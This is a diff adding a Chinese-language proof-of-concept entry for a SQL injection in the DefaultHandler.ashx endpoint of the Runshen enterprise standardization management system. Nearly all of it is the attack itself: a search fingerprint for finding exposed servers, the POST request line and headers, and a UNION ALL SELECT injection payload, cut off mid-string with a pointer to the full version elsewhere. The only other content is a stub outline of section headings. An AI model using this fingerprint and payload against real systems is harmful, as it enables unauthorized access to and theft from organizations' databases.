@@ -1,0 +1,19 @@
+# 润申企业标准化管理系统DefaultHandler存在SQL注入漏洞
+
+- **系统**：润申企业标准化管理系统　|　**类型**：SQL注入　|　**CVE**：—
+- **指纹**：`web.body="PDCA/js/_publicCom.js"`
+- **请求**：`POST /ashx/DefaultHandler.ashx HTTP/1.1`
+- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 32`
+
+**请求体 / payload**
+```
+action=GetDetail&status=300&id=1+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%2885%29%2BCHAR%28122%29%2BCHAR%2883%29%2BCHAR%28113%29%2BCHAR%2890%29%2BCHAR%28120%29%2BCHAR%2888%29%2BCHAR%28103%29%2BCHAR%2886%29%2BCHAR%28122%29%2BCHAR%2876%29%2BCHAR%2881%29%2BCHAR%2868%29%2BCHAR%2871%29%2BCHAR%2866%29%2BCHAR%28104%29%2BCHAR%2872%29%2BCHAR%28117%29%2BCHAR%2890%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28117%29%2BCHAR%28105%29%2BCHAR%2865%29%2BCHAR%28100%29%2BCHAR%28111%29%2BCHAR%28118%29%2BCHAR%28119%29%2BCHAR%28…（脚本共 1068 字，完整版见原文）
+```
+
+**其他**
+- 润申企业标准化管理系统DefaultHandler存在SQL注入漏洞: * 一、漏洞简介
+* 二、影响版本
+* 三、资产测绘
+* 四、漏洞复现
+***
+- 版本: * 润申企业标准化管理系统
